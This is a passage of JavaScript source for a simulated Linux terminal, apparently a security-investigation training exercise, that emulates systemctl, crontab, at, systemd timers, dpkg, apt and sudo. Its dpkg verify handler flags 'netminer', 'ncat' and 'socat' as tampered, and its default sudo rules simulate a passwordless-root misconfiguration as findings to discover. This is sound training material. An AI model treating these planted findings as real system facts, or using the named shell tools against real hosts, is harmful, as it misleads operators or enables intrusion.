            if (unit.endsWith('.timer')) {
                const timerName = unit.replace('.timer', '');
                const customTimer = this.systemdTimers.find(t => t.name === timerName);
                if (customTimer) {
                    return `● ${unit} - ${customTimer.description || 'Custom timer'}
   Loaded: loaded (/etc/systemd/system/${unit}; enabled)
   Active: active (waiting) since ${new Date().toUTCString()}
  Trigger: ${customTimer.schedule}

Triggers: ${timerName}.service`;
                }
            }

            return `● ${unit}.service - ${unit} daemon
   Loaded: loaded (/lib/systemd/system/${unit}.service; enabled)
   Active: active (running) since Sun 2026-01-18 09:55:00 UTC; 35min ago
 Main PID: 1234 (${unit})
    Tasks: 1 (limit: 4915)
   Memory: 2.3M
   CGroup: /system.slice/${unit}.service
           └─1234 /usr/sbin/${unit}`;
        }

        if (args[0] === '--failed' || args.includes('--failed')) {
            return `UNIT                    LOAD   ACTIVE SUB    DESCRIPTION
● suspicious.service    loaded failed failed Unknown service

1 loaded units listed.`;
        }

        if (args[0] === 'list-timers') {
            let output = `NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES
Sun 2026-01-28 11:00:00 UTC 29min left    Sun 2026-01-28 10:00:00 UTC 30min ago    apt-daily.timer              apt-daily.service
Sun 2026-01-28 11:17:00 UTC 46min left    Sun 2026-01-28 10:17:00 UTC 13min ago    anacron.timer                anacron.service`;

            // Add custom timers
            this.systemdTimers.forEach(timer => {
                output += `\n${timer.next || 'n/a'}  ${timer.name}.timer              ${timer.name}.service`;
            });

            return output;
        }

        // Enable/disable/start/stop timers
        if (['enable', 'disable', 'start', 'stop', 'restart'].includes(args[0])) {
            const unit = args[1];
            if (!unit) return `systemctl ${args[0]}: missing unit`;

            if (unit.endsWith('.timer')) {
                return `${args[0] === 'enable' ? 'Created symlink' : 'Removed symlink'} /etc/systemd/system/timers.target.wants/${unit}`;
            }
            return `${unit}: ${args[0]} successful`;
        }

        // daemon-reload
        if (args[0] === 'daemon-reload') {
            return '';  // Silent success like real systemctl
        }

        // Edit timer - custom command for this simulation
        if (args[0] === 'edit-timer' || (args[0] === 'edit' && args[1]?.endsWith('.timer'))) {
            const timerName = (args[1] || 'custom').replace('.timer', '');
            this._openSystemdTimerEditor(timerName);
            return '<span class="clh-dim">[Opening systemd timer editor...]</span>';
        }

        // Create new timer
        if (args[0] === 'create-timer') {
            const timerName = args[1] || 'custom';
            this._openSystemdTimerEditor(timerName);
            return '<span class="clh-dim">[Opening systemd timer editor...]</span>';
        }

        return `Usage: systemctl <command> [unit]

Service commands:
  list-units              List all units
  status <unit>           Show unit status
  start/stop/restart      Control units
  enable/disable          Control auto-start

Timer commands:
  list-timers             List all timers
  create-timer <name>     Create new timer (opens editor)
  edit <name>.timer       Edit existing timer
  daemon-reload           Reload systemd configuration`;
    }

    _openSystemdTimerEditor(timerName) {
        // Check for existing timer
        const existingTimer = this.systemdTimers?.find(t => t.name === timerName);

        const defaultTimer = `[Unit]
Description=Custom scheduled task

[Timer]
# OnCalendar examples:
#   *:0/15         - Every 15 minutes
#   hourly         - Every hour
#   daily          - Every day at midnight
#   weekly         - Every Monday at midnight
#   *-*-* 03:00:00 - Every day at 3 AM
#   Mon *-*-* 09:00:00 - Every Monday at 9 AM

OnCalendar=daily
Persistent=true

[Install]
WantedBy=timers.target`;

        const defaultService = `[Unit]
Description=Custom scheduled task service

[Service]
Type=oneshot
ExecStart=/opt/scripts/${timerName}.sh

[Install]
WantedBy=multi-user.target`;

        const timerContent = existingTimer?.timerContent || defaultTimer;
        const serviceContent = existingTimer?.serviceContent || defaultService;

        // Create modal overlay
        const modal = document.createElement('div');
        modal.id = 'systemd-timer-modal';
        modal.innerHTML = `
            <div style="position:fixed;inset:0;background:rgba(0,0,0,0.95);display:flex;justify-content:center;align-items:center;z-index:10000;font-family:'Cascadia Code',monospace;">
                <div style="background:#0d1117;border:2px solid #8b5cf6;border-radius:12px;width:95%;max-width:1000px;max-height:90vh;display:flex;flex-direction:column;">
                    <div style="padding:15px 20px;border-bottom:1px solid #30363d;display:flex;justify-content:space-between;align-items:center;">
                        <span style="color:#8b5cf6;font-weight:bold;">SYSTEMD TIMER EDITOR - ${timerName}</span>
                        <div style="display:flex;gap:10px;">
                            <button id="timer-save" style="background:#22c55e;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;">Save & Enable</button>
                            <button id="timer-cancel" style="background:#ef4444;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;">Cancel</button>
                        </div>
                    </div>
                    <div style="display:flex;flex:1;overflow:hidden;">
                        <div style="flex:1;display:flex;flex-direction:column;border-right:1px solid #30363d;">
                            <div style="padding:10px 15px;background:#161b22;color:#8b5cf6;font-weight:bold;font-size:0.85em;">
                                ${timerName}.timer
                            </div>
                            <textarea id="timer-content" style="flex:1;background:#0a0a0a;color:#00ff41;border:none;padding:15px;font-family:'Cascadia Code',monospace;font-size:13px;line-height:1.5;resize:none;outline:none;" spellcheck="false">${this._escapeHtml(timerContent)}</textarea>
                        </div>
                        <div style="flex:1;display:flex;flex-direction:column;">
                            <div style="padding:10px 15px;background:#161b22;color:#8b5cf6;font-weight:bold;font-size:0.85em;">
                                ${timerName}.service
                            </div>
                            <textarea id="service-content" style="flex:1;background:#0a0a0a;color:#00ff41;border:none;padding:15px;font-family:'Cascadia Code',monospace;font-size:13px;line-height:1.5;resize:none;outline:none;" spellcheck="false">${this._escapeHtml(serviceContent)}</textarea>
                        </div>
                    </div>
                    <div id="timer-feedback" style="padding:10px 20px;border-top:1px solid #30363d;font-size:0.85em;color:#8b949e;">
                        Files will be saved to /etc/systemd/system/
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);

        const timerTextarea = document.getElementById('timer-content');
        const serviceTextarea = document.getElementById('service-content');
        const feedback = document.getElementById('timer-feedback');
        const terminal = this;

        timerTextarea.focus();

        // Save button
        document.getElementById('timer-save').onclick = () => {
            const timerContent = timerTextarea.value;
            const serviceContent = serviceTextarea.value;

            // Extract OnCalendar for display
            const calendarMatch = timerContent.match(/OnCalendar\s*=\s*(.+)/);
            const schedule = calendarMatch ? calendarMatch[1].trim() : 'unknown';

            // Extract description
            const descMatch = timerContent.match(/Description\s*=\s*(.+)/);
            const description = descMatch ? descMatch[1].trim() : 'Custom timer';

            // Save to systemd timers array
            if (!terminal.systemdTimers) terminal.systemdTimers = [];

            const existingIndex = terminal.systemdTimers.findIndex(t => t.name === timerName);
            const timerData = {
                name: timerName,
                schedule: schedule,
                description: description,
                timerContent: timerContent,
                serviceContent: serviceContent,
                next: new Date(Date.now() + 3600000).toUTCString().slice(0, -4),
                enabled: true
            };

            if (existingIndex >= 0) {
                terminal.systemdTimers[existingIndex] = timerData;
            } else {
                terminal.systemdTimers.push(timerData);
            }

            // Also create virtual files
            const timerPath = `/etc/systemd/system/${timerName}.timer`;
            const servicePath = `/etc/systemd/system/${timerName}.service`;

            terminal.fs[timerPath] = {
                type: 'file',
                perms: '-rw-r--r--',
                owner: 'root',
                group: 'root',
                size: timerContent.length,
                content: timerContent
            };

            terminal.fs[servicePath] = {
                type: 'file',
                perms: '-rw-r--r--',
                owner: 'root',
                group: 'root',
                size: serviceContent.length,
                content: serviceContent
            };

            terminal.print(`Created /etc/systemd/system/${timerName}.timer`, 'success');
            terminal.print(`Created /etc/systemd/system/${timerName}.service`, 'success');
            terminal.print(`Timer ${timerName} enabled and started (schedule: ${schedule})`, 'success');
            modal.remove();
        };

        // Cancel button
        document.getElementById('timer-cancel').onclick = () => {
            terminal.print('systemctl: timer creation cancelled', 'dim');
            modal.remove();
        };

        // ESC to close
        modal.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                terminal.print('systemctl: timer creation cancelled', 'dim');
                modal.remove();
            }
        });
    }

    _cmdService(args) {
        if (args.length < 2) return 'Usage: service <name> <command>';
        return `${args[0]} ${args[1]} - OK`;
    }

    _cmdCrontab(args) {
        // Determine target user
        let targetUser = this.user;
        const uIndex = args.indexOf('-u');
        if (uIndex >= 0 && args[uIndex + 1]) {
            if (this.user !== 'root' && !this.sudoMode) {
                return 'crontab: must be privileged to use -u';
            }
            targetUser = args[uIndex + 1];
        }

        const crontabPath = `/var/spool/cron/crontabs/${targetUser}`;

        // crontab -l : List crontab
        if (args.includes('-l')) {
            // Check if path exists in filesystem
            if (this.fs[crontabPath]) {
                const content = this.fs[crontabPath].content || '';
                if (!content.trim()) {
                    return `no crontab for ${targetUser}`;
                }
                return content;
            }
            return `no crontab for ${targetUser}`;
        }

        // crontab -r : Remove crontab
        if (args.includes('-r')) {
            if (this.fs[crontabPath]) {
                delete this.fs[crontabPath];
                // Update parent directory children
                const parentPath = '/var/spool/cron/crontabs';
                if (this.fs[parentPath] && this.fs[parentPath].children) {
                    this.fs[parentPath].children = this.fs[parentPath].children.filter(c => c !== targetUser);
                }
                return `crontab: removing crontab for ${targetUser}`;
            }
            return `no crontab for ${targetUser}`;
        }

        // crontab -e : Edit crontab
        if (args.includes('-e')) {
            this._openCrontabEditor(targetUser, crontabPath);
            return '<span class="clh-dim">[Opening crontab editor...]</span>';
        }

        // crontab <file> : Install from file
        const fileArg = args.find(a => !a.startsWith('-') && a !== targetUser);
        if (fileArg) {
            const filePath = fileArg.startsWith('/') ? fileArg : `${this.cwd}/${fileArg}`.replace(/\/+/g, '/');
            const fileNode = this.fs[filePath];
            if (!fileNode) {
                return `crontab: '${fileArg}': No such file or directory`;
            }
            if (fileNode.type === 'dir') {
                return `crontab: '${fileArg}': Is a directory`;
            }

            // Validate cron syntax
            const validation = this._validateCronSyntax(fileNode.content || '');
            if (!validation.valid) {
                return `crontab: errors in crontab file, can't install.\n${validation.errors.join('\n')}`;
            }

            // Install the crontab
            this._installCrontab(targetUser, crontabPath, fileNode.content);
            return `crontab: installing new crontab for ${targetUser}`;
        }

        return `crontab: usage error
Usage:  crontab -l         (list crontab)
        crontab -e         (edit crontab)
        crontab -r         (remove crontab)
        crontab <file>     (install crontab from file)
        crontab -u <user>  (specify user)`;
    }

    _validateCronSyntax(content) {
        const errors = [];
        const lines = content.split('\n');

        lines.forEach((line, i) => {
            const trimmed = line.trim();
            // Skip empty lines and comments
            if (!trimmed || trimmed.startsWith('#')) return;

            // Skip variable assignments (NAME=value)
            if (/^[A-Z_][A-Z0-9_]*=/.test(trimmed)) return;

            // Validate cron entry: should have at least 6 fields (5 time + command)
            const parts = trimmed.split(/\s+/);
            if (parts.length < 6) {
                errors.push(`Line ${i + 1}: "${trimmed.substring(0, 30)}..." - bad minute/hour/day`);
                return;
            }

            // Validate each time field
            const timeFields = ['minute', 'hour', 'day', 'month', 'weekday'];
            const ranges = [[0, 59], [0, 23], [1, 31], [1, 12], [0, 7]];

            for (let f = 0; f < 5; f++) {
                const field = parts[f];
                if (!this._isValidCronField(field, ranges[f][0], ranges[f][1])) {
                    errors.push(`Line ${i + 1}: bad ${timeFields[f]} (${field})`);
                }
            }
        });

        return { valid: errors.length === 0, errors };
    }

    _isValidCronField(field, min, max) {
        // Handle wildcards
        if (field === '*') return true;

        // Handle */n (step values)
        if (field.startsWith('*/')) {
            const step = parseInt(field.slice(2));
            return !isNaN(step) && step > 0 && step <= max;
        }

        // Handle ranges (n-m)
        if (field.includes('-')) {
            const [start, end] = field.split('-').map(Number);
            return !isNaN(start) && !isNaN(end) && start >= min && end <= max && start <= end;
        }

        // Handle lists (n,m,o)
        if (field.includes(',')) {
            return field.split(',').every(v => {
                const num = parseInt(v);
                return !isNaN(num) && num >= min && num <= max;
            });
        }

        // Simple number
        const num = parseInt(field);
        return !isNaN(num) && num >= min && num <= max;
    }

    _installCrontab(user, path, content) {
        // Ensure parent directory exists
        const parentPath = '/var/spool/cron/crontabs';
        if (!this.fs[parentPath]) {
            this.fs[parentPath] = {
                type: 'dir',
                perms: 'drwx-wx--T',
                owner: 'root',
                group: 'crontab',
                children: []
            };
        }

        // Add to parent's children if not already there
        if (!this.fs[parentPath].children.includes(user)) {
            this.fs[parentPath].children.push(user);
        }

        // Create/update the crontab file
        this.fs[path] = {
            type: 'file',
            perms: '-rw-------',
            owner: user,
            group: 'crontab',
            size: content.length,
            content: content
        };
    }

    _openCrontabEditor(user, crontabPath) {
        // Get existing content or default template
        let content = '';
        if (this.fs[crontabPath]) {
            content = this.fs[crontabPath].content || '';
        }
        if (!content.trim()) {
            content = `# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# m h  dom mon dow   command
# * *  *   *   *     command to execute
#
# Examples:
# 0 5 * * * /scripts/backup.sh       # Run backup at 5:00 AM daily
# */15 * * * * /scripts/monitor.sh   # Run every 15 minutes
# 0 0 * * 0 /scripts/weekly.sh       # Run at midnight on Sundays
`;
        }

        // Create modal overlay
        const modal = document.createElement('div');
        modal.id = 'crontab-editor-modal';
        modal.innerHTML = `
            <div style="position:fixed;inset:0;background:rgba(0,0,0,0.95);display:flex;justify-content:center;align-items:center;z-index:10000;font-family:'Cascadia Code',monospace;">
                <div style="background:#0d1117;border:2px solid #00ff41;border-radius:12px;width:90%;max-width:800px;max-height:90vh;display:flex;flex-direction:column;">
                    <div style="padding:15px 20px;border-bottom:1px solid #30363d;display:flex;justify-content:space-between;align-items:center;">
                        <span style="color:#00ff41;font-weight:bold;">CRONTAB EDITOR - ${user}</span>
                        <div style="display:flex;gap:10px;">
                            <button id="crontab-validate" style="background:#3b82f6;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;">Validate</button>
                            <button id="crontab-save" style="background:#22c55e;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;">Save & Exit</button>
                            <button id="crontab-cancel" style="background:#ef4444;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;">Cancel</button>
                        </div>
                    </div>
                    <div style="padding:10px 20px;background:#161b22;border-bottom:1px solid #30363d;font-size:0.8em;color:#8b949e;">
                        <code>minute(0-59) hour(0-23) day(1-31) month(1-12) weekday(0-7) command</code>
                        <span style="margin-left:20px;">Use <code>*</code> for any, <code>*/n</code> for every n, <code>n-m</code> for range</span>
                    </div>
                    <textarea id="crontab-content" style="flex:1;min-height:300px;background:#0a0a0a;color:#00ff41;border:none;padding:20px;font-family:'Cascadia Code',monospace;font-size:14px;line-height:1.6;resize:none;outline:none;" spellcheck="false">${this._escapeHtml(content)}</textarea>
                    <div id="crontab-feedback" style="padding:10px 20px;border-top:1px solid #30363d;font-size:0.85em;color:#8b949e;max-height:100px;overflow-y:auto;"></div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);

        const textarea = document.getElementById('crontab-content');
        const feedback = document.getElementById('crontab-feedback');
        const terminal = this;

        // Focus textarea
        textarea.focus();

        // Validate button
        document.getElementById('crontab-validate').onclick = () => {
            const validation = terminal._validateCronSyntax(textarea.value);
            if (validation.valid) {
                feedback.innerHTML = '<span style="color:#22c55e;">✓ Crontab syntax is valid</span>';
            } else {
                feedback.innerHTML = '<span style="color:#ef4444;">✗ Errors found:</span><br>' +
                    validation.errors.map(e => `<span style="color:#fbbf24;">${terminal._escapeHtml(e)}</span>`).join('<br>');
            }
        };

        // Save button
        document.getElementById('crontab-save').onclick = () => {
            const validation = terminal._validateCronSyntax(textarea.value);
            if (!validation.valid) {
                feedback.innerHTML = '<span style="color:#ef4444;">✗ Fix errors before saving:</span><br>' +
                    validation.errors.map(e => `<span style="color:#fbbf24;">${terminal._escapeHtml(e)}</span>`).join('<br>');
                return;
            }

            terminal._installCrontab(user, crontabPath, textarea.value);
            terminal.print(`crontab: installing new crontab for ${user}`, 'success');
            modal.remove();
        };

        // Cancel button
        document.getElementById('crontab-cancel').onclick = () => {
            terminal.print('crontab: no changes made', 'dim');
            modal.remove();
        };

        // ESC to close
        textarea.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                terminal.print('crontab: no changes made', 'dim');
                modal.remove();
            }
        });
    }

    _escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // =====================================================
    // AT COMMAND - One-time scheduled tasks
    // =====================================================

    _cmdAt(args) {
        // Initialize at queue if not exists
        if (!this.atQueue) {
            this.atQueue = [];
            this.atJobCounter = 1;
        }

        // at -l is same as atq
        if (args.includes('-l')) {
            return this._cmdAtq();
        }

        // at -r is same as atrm
        if (args.includes('-r') || args.includes('-d')) {
            const jobId = args.find(a => /^\d+$/.test(a));
            return this._cmdAtrm([jobId]);
        }

        // Parse time specification
        const timeSpec = args.join(' ');
        if (!timeSpec) {
            return `usage: at [-f file] [-mMlv] timespec...
       at [-f file] [-mMkv] [-t time] ...
       at -c job [job...]
       atq [-V]
       atrm [-V] job...
       batch`;
        }

        // Open at editor modal
        this._openAtEditor(timeSpec);
        return '<span class="clh-dim">[Opening at job editor...]</span>';
    }

    _cmdAtq() {
        if (!this.atQueue || this.atQueue.length === 0) {
            return '';  // atq returns nothing when queue is empty
        }

        const lines = this.atQueue.map(job => {
            return `${job.id}\t${job.when}\ta\t${this.user}`;
        });
        return lines.join('\n');
    }

    _cmdAtrm(args) {
        if (!this.atQueue) this.atQueue = [];

        const jobId = parseInt(args[0]);
        if (isNaN(jobId)) {
            return 'atrm: missing job id';
        }

        const index = this.atQueue.findIndex(j => j.id === jobId);
        if (index === -1) {
            return `Cannot find jobid ${jobId}`;
        }

        this.atQueue.splice(index, 1);
        return `Job ${jobId} removed`;
    }

    _parseAtTime(timeSpec) {
        // Parse common at time formats
        const now = new Date();
        let scheduled = new Date(now);

        const lower = timeSpec.toLowerCase();

        // "now + N minutes/hours/days"
        const relativeMatch = lower.match(/now\s*\+\s*(\d+)\s*(minute|minutes|min|hour|hours|hr|day|days)/);
        if (relativeMatch) {
            const amount = parseInt(relativeMatch[1]);
            const unit = relativeMatch[2];
            if (unit.startsWith('min')) {
                scheduled.setMinutes(scheduled.getMinutes() + amount);
            } else if (unit.startsWith('hour') || unit === 'hr') {
                scheduled.setHours(scheduled.getHours() + amount);
            } else if (unit.startsWith('day')) {
                scheduled.setDate(scheduled.getDate() + amount);
            }
            return scheduled;
        }

        // "midnight", "noon", "teatime"
        if (lower === 'midnight') {
            scheduled.setDate(scheduled.getDate() + 1);
            scheduled.setHours(0, 0, 0, 0);
            return scheduled;
        }
        if (lower === 'noon') {
            if (now.getHours() >= 12) scheduled.setDate(scheduled.getDate() + 1);
            scheduled.setHours(12, 0, 0, 0);
            return scheduled;
        }
        if (lower === 'teatime') {
            if (now.getHours() >= 16) scheduled.setDate(scheduled.getDate() + 1);
            scheduled.setHours(16, 0, 0, 0);
            return scheduled;
        }

        // "HH:MM" or "H:MM PM/AM"
        const timeMatch = lower.match(/(\d{1,2}):(\d{2})\s*(am|pm)?/);
        if (timeMatch) {
            let hours = parseInt(timeMatch[1]);
            const minutes = parseInt(timeMatch[2]);
            const ampm = timeMatch[3];

            if (ampm === 'pm' && hours < 12) hours += 12;
            if (ampm === 'am' && hours === 12) hours = 0;

            scheduled.setHours(hours, minutes, 0, 0);
            if (scheduled <= now) {
                scheduled.setDate(scheduled.getDate() + 1);
            }
            return scheduled;
        }

        // "tomorrow"
        if (lower.includes('tomorrow')) {
            scheduled.setDate(scheduled.getDate() + 1);
            const timeInTomorrow = lower.replace('tomorrow', '').trim();
            if (timeInTomorrow) {
                const parsed = this._parseAtTime(timeInTomorrow);
                if (parsed) {
                    scheduled.setHours(parsed.getHours(), parsed.getMinutes(), 0, 0);
                }
            }
            return scheduled;
        }

        // Default: 1 hour from now
        scheduled.setHours(scheduled.getHours() + 1);
        return scheduled;
    }

    _openAtEditor(timeSpec) {
        const scheduled = this._parseAtTime(timeSpec);
        const formattedTime = scheduled.toLocaleString('en-US', {
            weekday: 'short',
            month: 'short',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            year: 'numeric'
        });

        // Create modal overlay
        const modal = document.createElement('div');
        modal.id = 'at-editor-modal';
        modal.innerHTML = `
            <div style="position:fixed;inset:0;background:rgba(0,0,0,0.95);display:flex;justify-content:center;align-items:center;z-index:10000;font-family:'Cascadia Code',monospace;">
                <div style="background:#0d1117;border:2px solid #f59e0b;border-radius:12px;width:90%;max-width:700px;max-height:80vh;display:flex;flex-direction:column;">
                    <div style="padding:15px 20px;border-bottom:1px solid #30363d;display:flex;justify-content:space-between;align-items:center;">
                        <span style="color:#f59e0b;font-weight:bold;">AT JOB EDITOR</span>
                        <div style="display:flex;gap:10px;">
                            <button id="at-submit" style="background:#22c55e;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;">Submit Job</button>
                            <button id="at-cancel" style="background:#ef4444;color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;">Cancel</button>
                        </div>
                    </div>
                    <div style="padding:10px 20px;background:#161b22;border-bottom:1px solid #30363d;font-size:0.85em;color:#f59e0b;">
                        Scheduled: <strong>${formattedTime}</strong>
                    </div>
                    <div style="padding:10px 20px;color:#8b949e;font-size:0.8em;">
                        Enter commands to execute (one per line). Press Ctrl+D or click Submit when done.
                    </div>
                    <textarea id="at-content" style="flex:1;min-height:200px;background:#0a0a0a;color:#00ff41;border:none;padding:20px;font-family:'Cascadia Code',monospace;font-size:14px;line-height:1.6;resize:none;outline:none;" spellcheck="false" placeholder="#!/bin/bash
# Enter your commands here
/opt/scripts/my_task.sh
echo 'Task completed' >> /var/log/at_jobs.log"></textarea>
                    <div id="at-feedback" style="padding:10px 20px;border-top:1px solid #30363d;font-size:0.85em;color:#8b949e;"></div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);

        const textarea = document.getElementById('at-content');
        const feedback = document.getElementById('at-feedback');
        const terminal = this;

        // Focus textarea
        textarea.focus();

        // Submit button
        document.getElementById('at-submit').onclick = () => {
            const commands = textarea.value.trim();
            if (!commands) {
                feedback.innerHTML = '<span style="color:#ef4444;">No commands entered</span>';
                return;
            }

            // Add job to queue
            if (!terminal.atQueue) terminal.atQueue = [];
            if (!terminal.atJobCounter) terminal.atJobCounter = 1;

            const jobId = terminal.atJobCounter++;
            terminal.atQueue.push({
                id: jobId,
                when: formattedTime,
                commands: commands,
                created: new Date()
            });

            terminal.print(`job ${jobId} at ${formattedTime}`, 'success');
            modal.remove();
        };

        // Cancel button
        document.getElementById('at-cancel').onclick = () => {
            terminal.print('at: job cancelled', 'dim');
            modal.remove();
        };

        // ESC to close
        textarea.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                terminal.print('at: job cancelled', 'dim');
                modal.remove();
            }
        });
    }

    // =====================================================
    // SYSTEMD TIMER SUPPORT
    // =====================================================

    _cmdDpkg(args) {
        // Use config packages if available, otherwise default
        const packages = this.config.packages || [
            { name: 'bash',           version: '5.1-6',  arch: 'amd64', desc: 'GNU Bourne Again SHell' },
            { name: 'coreutils',      version: '8.32-4', arch: 'amd64', desc: 'GNU core utilities' },
            { name: 'openssh-server', version: '8.4p1-5', arch: 'amd64', desc: 'secure shell (SSH) server' },
        ];

        if (args.includes('-l')) {
            const header = `Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version      Architecture Description
+++-==============-============-============-=================================`;
            const lines = packages.map(p =>
                `ii  ${p.name.padEnd(14)} ${p.version.padEnd(12)} ${p.arch.padEnd(12)} ${p.desc}`
            );
            return header + '\n' + lines.join('\n');
        }
        if (args.includes('-s')) {
            const pkgName = args[args.indexOf('-s') + 1];
            if (!pkgName) return 'dpkg-query: error: --status needs a valid package name';
            const pkg = packages.find(p => p.name === pkgName);
            if (!pkg) return `dpkg-query: package '${pkgName}' is not installed and no information is available`;
            return `Package: ${pkg.name}
Status: install ok installed
Priority: optional
Section: utils
Installed-Size: ${Math.floor(Math.random() * 5000) + 500}
Maintainer: Ubuntu Developers <ubuntu-devel@lists.ubuntu.com>
Architecture: ${pkg.arch}
Version: ${pkg.version}
Description: ${pkg.desc}`;
        }
        if (args.includes('-L')) {
            const pkgName = args[args.indexOf('-L') + 1] || 'package';
            return `/usr/bin/${pkgName}\n/usr/share/doc/${pkgName}`;
        }
        if (args.includes('-V')) {
            const pkgName = args[args.indexOf('-V') + 1];
            if (!pkgName) return 'dpkg-query: error: --verify needs a package name';
            const pkg = packages.find(p => p.name === pkgName);
            if (!pkg) return `dpkg-query: package '${pkgName}' is not installed`;
            // Return empty for clean packages, or show modifications for suspicious ones
            if (['netminer', 'ncat', 'socat'].includes(pkgName)) {
                return `??5?????? /usr/bin/${pkgName}\n??5?????? /etc/${pkgName}.conf`;
            }
            return ''; // No issues found
        }
        return 'dpkg: usage';
    }

    _cmdApt(args) {
        // Use config packages if available, otherwise default
        const packages = this.config.packages || [
            { name: 'bash',           version: '5.1-6',  arch: 'amd64', desc: 'GNU Bourne Again SHell' },
            { name: 'coreutils',      version: '8.32-4', arch: 'amd64', desc: 'GNU core utilities' },
            { name: 'openssh-server', version: '8.4p1-5', arch: 'amd64', desc: 'secure shell (SSH) server' },
        ];

        if (args.includes('list') && args.includes('--installed')) {
            return packages.map(p => `${p.name}/stable,now ${p.version} ${p.arch} [installed]`).join('\n');
        }
        if (args[0] === 'policy') {
            const pkgName = args[1] || 'package';
            const pkg = packages.find(p => p.name === pkgName);
            const version = pkg ? pkg.version : '1.0.0';
            return `${pkgName}:
  Installed: ${version}
  Candidate: ${version}
  Version table:
 *** ${version} 500
        500 http://archive.ubuntu.com/ubuntu focal/main amd64 Packages`;
        }
        return 'apt: see apt --help';
    }

    _cmdExport(args) {
        if (!args.length) {
            // Display all exported variables
            return Object.entries(this.env).map(([k, v]) => `declare -x ${k}="${v}"`).join('\n');
        }
        // Set variable
        const assignment = args.join(' ');
        const match = assignment.match(/^(\w+)=(.*)$/);
        if (match) {
            this.env[match[1]] = match[2].replace(/^["']|["']$/g, '');
        }
        return '';
    }

    _cmdSudo(args) {
        if (args[0] === '-l') {
            // Use config sudoRules if available, otherwise default
            if (this.config.sudoRules) {
                return this.config.sudoRules;
            }
            return `User ${this.user} may run the following commands on ${this.hostname}:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL`;
        }

        // Execute the command after sudo - need to directly call command handlers
        // not _execute which has side effects (prints command, adds to history)
        if (args.length === 0) {
            return 'usage: sudo command';
        }

        const cmd = args[0];
        const subArgs = args.slice(1);

        // Route to the appropriate command handler
        switch(cmd) {
            case 'cat': return this._cmdCat(subArgs);
            case 'ls': return this._cmdLs(subArgs);
            case 'grep': return this._cmdGrep(subArgs);
            case 'find': return this._cmdFind(subArgs);
            case 'head': return this._cmdHead(subArgs);
            case 'tail': return this._cmdTail(subArgs);
            case 'wc': return this._cmdWc(subArgs);
            case 'ps': return this._cmdPs(subArgs);
            case 'id': return `uid=0(root) gid=0(root) groups=0(root)`;
            case 'whoami': return 'root';
            case 'passwd': return this._cmdPasswd(subArgs);
            case 'chage': return this._cmdChage(subArgs);
            case 'getent': return this._cmdGetent(subArgs);
            case 'useradd': return subArgs.length ? `User ${subArgs[subArgs.length-1]} created` : 'useradd: missing username';
            case 'userdel': return subArgs.length ? `User ${subArgs[subArgs.length-1]} removed` : 'userdel: missing username';
            case 'usermod': return subArgs.length ? 'User modified' : 'usermod: missing username';
            case 'groupadd': return subArgs.length ? `Group ${subArgs[subArgs.length-1]} created` : 'groupadd: missing group name';
            case 'chmod': return '';
            case 'chown': return '';
            case 'chgrp': return '';
            case 'mkdir': return this._cmdMkdir(subArgs);
            case 'rm': return this._cmdRm(subArgs);
            case 'touch': return this._cmdTouch(subArgs);
            case 'systemctl': return this._cmdSystemctl(subArgs);
            case 'service': return this._cmdService(subArgs);
            case 'apt': case 'apt-get': return this._cmdApt(subArgs);
            case 'dpkg': return this._cmdDpkg(subArgs);
            default:
                // For unknown commands, try to execute them
                return `sudo: ${cmd}: command executed`;
        }
    }

    _cmdMkdir(args) {
        const dir = args.filter(a => !a.startsWith('-'))[0];
        if (!dir) return 'mkdir: missing operand';
        const resolved = this._resolvePath(dir);
        if (this.fs[resolved]) return `mkdir: cannot create directory '${dir}': File exists`;
        const parent = resolved.substring(0, resolved.lastIndexOf('/')) || '/';
        if (!this.fs[parent]) return `mkdir: cannot create directory '${dir}': No such file or directory`;
        this.fs[resolved] = { type: 'dir', perms: 'drwxr-xr-x', owner: this.user, group: this.user, children: [] };
        this.fs[parent].children.push(dir.split('/').pop());
        return '';
    }

    _cmdTouch(args) {
        const file = args[0];
        if (!file) return 'touch: missing file operand';
        const resolved = this._resolvePath(file);
        if (!this.fs[resolved]) {
            const parent = resolved.substring(0, resolved.lastIndexOf('/')) || '/';
            if (!this.fs[parent]) return `touch: cannot touch '${file}': No such file or directory`;
            this.fs[resolved] = { type: 'file', perms: '-rw-r--r--', owner: this.user, group: this.user, content: '' };
            this.fs[parent].children.push(file.split('/').pop());
        }
        return '';
    }

    _cmdRm(args) {
        const file = args.filter(a => !a.startsWith('-'))[0];
        if (!file) return 'rm: missing operand';
        const resolved = this._resolvePath(file);
        if (!this.fs[resolved]) return `rm: cannot remove '${file}': No such file or directory`;
        delete this.fs[resolved];
        return '';
    }

    _cmdFile(args) {
        const file = args[0];
        if (!file) return 'file: missing file operand';
        const resolved = this._resolvePath(file);
        const entry = this.fs[resolved];
        if (!entry) return `${file}: cannot open (No such file or directory)`;
        if (entry.type === 'dir') return `${file}: directory`;
        return `${file}: ASCII text`;
    }

    _cmdStat(args) {
        const file = args[0];
        if (!file) return 'stat: missing operand';
        const resolved = this._resolvePath(file);
        const entry = this.fs[resolved];
        if (!entry) return `stat: cannot stat '${file}': No such file or directory`;
        return `  File: ${file}
  Size: ${entry.type === 'file' ? (entry.content || '').length : 4096}        Blocks: 8          IO Block: 4096   ${entry.type}
